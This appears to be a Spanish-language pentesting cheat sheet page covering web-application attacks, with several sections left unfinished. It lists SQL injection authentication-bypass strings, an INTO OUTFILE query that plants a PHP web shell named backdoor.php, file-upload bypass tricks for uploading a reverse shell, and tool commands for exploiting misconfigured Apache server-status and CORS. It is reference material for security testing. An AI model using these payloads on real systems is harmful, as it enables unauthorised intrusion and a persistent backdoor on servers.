---
layout: article
title: Pentesting - Ataques a aplicaciones web
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2><b>Configuraciones inseguras</b></h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Apache</div>
</div>

Cuando nos encontramos un servidor con el siguiente path 'http://example.com/server-status', este suele hacer referencia a '[Apache monitoring](https://www.datadoghq.com/blog/collect-apache-performance-metrics/#:~:text=Apache%20web%20server%20exposes%20metrics,mod_status%20in%20your%20configuration%20file.)'.

Normalmente no se encuentra accesible, pero si no se encuentra adecuadamente configurado, puede llevar a que se pueda obtener información sensible como:

* Todas las URL a las que ha realizado peticiones el servidor (ficheros, directorios, sesiones, etc).
* Todas las IPs de los clientes.

**server-status_PWN**

[https://github.com/mazen160/server-status_PWN.git](https://github.com/mazen160/server-status_PWN.git)

Esta herramienta permite obtener esta información en caso de que no se encuentre bien configurado:

~~~bash
python server-status_PWN.py --url 'http://example.com/server-status'
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CORS</div>
</div>

[https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)

**Corsy**

[https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)

~~~
python3 corsy.py -u https://example.com
python3 corsy.py -i /path/urls.txt -o /path/output.json
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Cookies</div>
</div>

//TODO

<h2><b>Explotación de vulnerabilidades en aplicaciones web</b></h2>

<h3><b>Ataques desde el lado del servidor</b></h3>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Inyección SQL</div>
</div>

Este tipo de ataques se da cuando una entrada que se encuentra conectada con una base de datos no está filtrada adecuadamente, provocando que el código SQL se interpretado y se consiga ejecutar consultas SQL. 

¿Dónde se suelen encontrar?

En buscadores, parámetros, filtros, paneles de login, ... en definitiva, toda entrada que realice una consulta a la base de datos para la extracción, inserción o actualización de información.

Según la consulta que se explote, esta explotación será más fácil o más laboriosa.

**Pruebas básicas**

~~~
'or'1'='1
'and'1'='1
'or'1'='1'-- -
'or'1'='1'#
admin'#
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
admin\'-- -
~~~

**Subida de un fichero malicioso**

~~~
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
~~~

**Cheatsheets**

[https://websec.wordpress.com/tag/sql-filter-bypass/](https://websec.wordpress.com/tag/sql-filter-bypass/)

[https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)

//TODO

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Inyección de comandos</div>
</div>

//TODO

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSRF</div>
</div>

**Cheatsheets**

[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)

[https://github.com/jdonsec/AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF)

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSTI</div>
</div>

[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

~~~
./tplmap.py -u 'http://www.target.com/page?name=John'
~~~

//TODO

<h3><b>Ataques desde el lado del cliente</b></h3>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">XSS</div>
</div>


**Cheatsheet**

[https://github.com/s0md3v/AwesomeXSS/](https://github.com/s0md3v/AwesomeXSS/)

[https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

[https://gbhackers.com/top-500-important-xss-cheat-sheet/](https://gbhackers.com/top-500-important-xss-cheat-sheet/)

//TODO

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CSRF</div>
</div>

//TODO

**Cheatsheets**

[https://www.hackingarticles.in/understanding-the-csrf-vulnerability-a-beginners-guide/](https://www.hackingarticles.in/understanding-the-csrf-vulnerability-a-beginners-guide/)

<h3><b>Ficheros</b></h3>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Subida de ficheros</div>
</div>

**Doble extensión**

Cuando sólo se comprueba la extensión del fichero.

~~~
file.php.png
~~~

**Null byte**

Cuando sólo se comprueba la extensión del fichero y se interpreta el null byte como fin de la cadena.

~~~
file.php%00.png
~~~

**MIME Type**

Utilizando algún programa que intercepte la petición mandada al servidor con el fichero que se desee (obviamente una reverse shell xD), modificar el valor de la cabecera 'Content-Type' (application/x-php) por el tipo de fichero soportado (ej:image/png)

~~~
Content-Type: application/x-php --> Content-Type: image/png
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Inclusión de ficheros locales</div>
</div>

Bien conocido como 'LFI' o Local File Inclusión.

**LFI a RFI aka LFI to RFI**

[http://securityidiots.com/Web-Pentest/LFI](http://securityidiots.com/Web-Pentest/LFI)

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Inclusión de ficheros remotos</div>
</div>

Bien conocido como 'RFI' o Remote File Inclusión.


<h2><b>Cheatsheets</b></h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Open Redirect</div>
</div>

<table class="table-full">
<tr>
<td class="td-red">Fuzzing</td>
</tr>
<tr>
<td>/{payload}<br>
?next={payload}<br>
?url={payload}<br>
?target={payload}<br>
?url={payload}<br>
?dest={payload}<br>
?destination={payload}<br>
?redir={payload}<br>
?redirect_url={payload}<br>
?redirect={payload}
</td>
</tr>
</table>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">XSS</div>
</div>

<table class="table-full">
<tr>
<td class="td-red">XSS Dorks</td>
</tr>
<tr>
<td>?q={payload}<br>
?s={payload}<br>
?search={payload}<br>
?id={payload}<br>
?lang={payload}<br>
?keyword={payload}<br>
?query={payload}<br>
?page={payload}<br>
?keyword={payload}<br>
?year={payload}<br>
?view={payload}<br>
?email={payload}<br>
?type={payload}<br>
?name={payload}<br>
?p={payload}<br>
?month={payload}<br>
?immagine={payload}<br>
?list_type={payload}<br>
?url={payload}<br>
?terms={payload}<br>
?categoryid={payload}<br>
?key={payload}<br>
?l={payload}<br>
?begindate={payload}<br>
?endate={payload}
</td>
</tr>
</table>

<h2><b>Recursos adicionales</b></h2>

[https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93](https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93)

[https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet](https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet)

[https://github.com/TarlogicSecurity/Chankro](https://github.com/TarlogicSecurity/Chankro)